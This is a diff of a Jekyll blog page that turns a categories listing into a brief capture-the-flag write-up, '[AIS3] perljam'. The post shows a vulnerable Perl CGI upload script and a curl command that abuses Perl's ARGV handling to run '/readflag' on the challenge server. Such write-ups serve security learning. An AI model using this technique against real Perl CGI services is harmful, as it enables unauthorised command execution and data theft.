@@ -12,31 +12,31 @@
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="description" content="A simple and awesome blog theme powered by jekyll.">
+  <meta name="description" content="perljam exploit at AIS3 2018 pre-exam">
   <meta name="keywords" content="Programming, PHP, and Ruby">
-  <meta name="author" content="Categories | Leonids">
+  <meta name="author" content="&#91;AIS3&#93; perljam | Leonids">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="theme-color" content="#f5f5f5">
 
   <!-- Twitter Tags -->
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Categories | Leonids">
-  <meta name="twitter:description" content="A simple and awesome blog theme powered by jekyll.">
+  <meta name="twitter:title" content="&#91;AIS3&#93; perljam | Leonids">
+  <meta name="twitter:description" content="perljam exploit at AIS3 2018 pre-exam">
   <meta name="twitter:image" content="https://WenYang-Lai.github.io//img/leonids-logo.png">
 
   <!-- Open Graph Tags -->
   <meta property="og:type" content="blog">
   <meta property="og:url" content="https://WenYang-Lai.github.io/">
-  <meta property="og:title" content="Categories | Leonids">
-  <meta property="og:description" content="A simple and awesome blog theme powered by jekyll.">
+  <meta property="og:title" content="&#91;AIS3&#93; perljam | Leonids">
+  <meta property="og:description" content="perljam exploit at AIS3 2018 pre-exam">
   <meta property="og:image" content="https://WenYang-Lai.github.io//img/leonids-logo.png">
-  <title>Categories | Leonids</title>
+  <title>&#91;AIS3&#93; perljam | Leonids</title>
 
   <!-- CSS files -->
   <link rel="stylesheet" href="https://WenYang-Lai.github.io//css/font-awesome.min.css">
   <link rel="stylesheet" href="https://WenYang-Lai.github.io//css/main.css">
 
-  <link rel="canonical" href="https://WenYang-Lai.github.io//categories/">
+  <link rel="canonical" href="https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam">
   <link rel="alternate" type="application/rss+xml" title="Leonids" href="https://WenYang-Lai.github.io/ /feed.xml " />
 
   <!-- Icons -->
@@ -136,65 +136,84 @@
     </div>
     <div class="col s12 m8">
       <div class="post-listing">
-          <div id="page">
-    <header class="page-header">
-      <h2>Categories</h2>
-    </header>
+        <a class="btn" href= "https://WenYang-Lai.github.io//" >
+  Home
+</a>
 
-    <article class="page-content">
-      <div class="tag-list">
 
-  <div class="tag-group">
-    
-    <h5 class="tag-group-title" id="ctf">ctf</h5>
-    
-    <article class="tag-item">
-      <a class="tag-item-title" href="https://WenYang-Lai.github.io//articles/2018-07/%5BPwnableTW%5D-applestore">&#91;Pwnable.TW&#93; applestore</a>
-    </article>
-    
-    <article class="tag-item">
-      <a class="tag-item-title" href="https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam">&#91;AIS3&#93; perljam</a>
-    </article>
-    
-    <article class="tag-item">
-      <a class="tag-item-title" href="https://WenYang-Lai.github.io//articles/2017-12/%5BPwnableTW%5D-secret_of_my_heart">&#91;Pwnable.TW&#93; secret_of_my_heart</a>
-    </article>
-    
-  </div>
 
-  <div class="tag-group">
-    
-    <h5 class="tag-group-title" id="pwn">pwn</h5>
-    
-    <article class="tag-item">
-      <a class="tag-item-title" href="https://WenYang-Lai.github.io//articles/2018-07/%5BPwnableTW%5D-applestore">&#91;Pwnable.TW&#93; applestore</a>
-    </article>
-    
-    <article class="tag-item">
-      <a class="tag-item-title" href="https://WenYang-Lai.github.io//articles/2017-12/%5BPwnableTW%5D-secret_of_my_heart">&#91;Pwnable.TW&#93; secret_of_my_heart</a>
-    </article>
-    
-  </div>
+<div id="post">
+  <header class="post-header">
+    <h1 title="&#91;AIS3&#93; perljam">&#91;AIS3&#93; perljam</h1>
+    <span class="post-meta">
+      <span class="post-date">
+        12 JUN 2018
+      </span>
+      •
+      <span class="read-time" title="Estimated read time">
+  
+  
+    1 min read
+  
+</span>
 
-  <div class="tag-group">
-    
-    <h5 class="tag-group-title" id="web">web</h5>
-    
-    <article class="tag-item">
-      <a class="tag-item-title" href="https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam">&#91;AIS3&#93; perljam</a>
-    </article>
-    
-  </div>
+    </span>
 
+  </header>
+
+  <article class="post-content">
+    <h3 id="src-code">src code</h3>
+<p>Get src code by dump /.git/ path</p>
+
+<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="k">use</span> <span class="nv">strict</span><span class="p">;</span>
+	<span class="k">use</span> <span class="nv">warnings</span><span class="p">;</span>
+	<span class="k">use</span> <span class="nv">CGI</span><span class="p">;</span>
+	<span class="k">my</span> <span class="nv">$cgi</span> <span class="o">=</span> <span class="nv">CGI</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="nv">upload</span><span class="p">(</span> <span class="s">'file'</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+		<span class="k">my</span> <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$cgi</span><span class="o">-&gt;</span><span class="nv">param</span><span class="p">(</span> <span class="s">'file'</span> <span class="p">);</span>
+		<span class="k">while</span> <span class="p">(</span> <span class="o">&lt;</span><span class="nv">$file</span><span class="o">&gt;</span> <span class="p">)</span> <span class="p">{</span>
+		<span class="k">print</span> <span class="s">"$_"</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span></code></pre></div>
+
+<p><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">blackhat Ref</a></p>
+
+<h3 id="exploit">exploit</h3>
+
+<pre><code>$ curl \                   
+    -F "file=ARGV" \
+    -F "file=@test.txt" \
+    -X POST \
+    "http://104.199.235.135:31334/cgi-bin/index.cgi?/readflag|"
+</code></pre>
+
+
+  </article>
 </div>
 
-    </article>
+<div class="share-buttons">
+  <h6>Share on: </h6>
+  <ul>
+    <li>
+      <a href="https://twitter.com/intent/tweet?text=https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam" class="twitter btn" title="Share on Twitter"><i class="fa fa-twitter"></i><span> Twitter</span></a>
+    </li>
+    <li>
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam" class="facebook btn" title="Share on Facebook"><i class="fa fa-facebook"></i><span> Facebook</span></a>
+    </li>
+    <li>
+      <a href="https://plus.google.com/share?url=https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam" class="google-plus btn" title="Share on Google Plus"><i class="fa fa-google-plus"></i><span> Google+</span></a>
+    </li>
+    <li>
+      <a href="https://news.ycombinator.com/submitlink?u=https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam" class="hacker-news btn" title="Share on Hacker News"><i class="fa fa-hacker-news"></i><span> Hacker News</span></a>
+    </li>
+    <li>
+      <a href="https://www.reddit.com/submit?url=https://WenYang-Lai.github.io//articles/2018-06/AIS3_perljam" class="reddit btn" title="Share on Reddit"><i class="fa fa-reddit"></i><span> Reddit</span></a>
+    </li>
+  </ul>
+</div><!-- end share-buttons -->
 
 
-  </div><!-- end page content -->
-
-
-  
 
         <footer>
   &copy; 2018 pandaft. Powered by <a href="http://jekyllrb.com/">Jekyll</a>, <a href="http://github.com/renyuanz/leonids/">leonids theme</a> made with <i class="fa fa-heart heart-icon"></i>
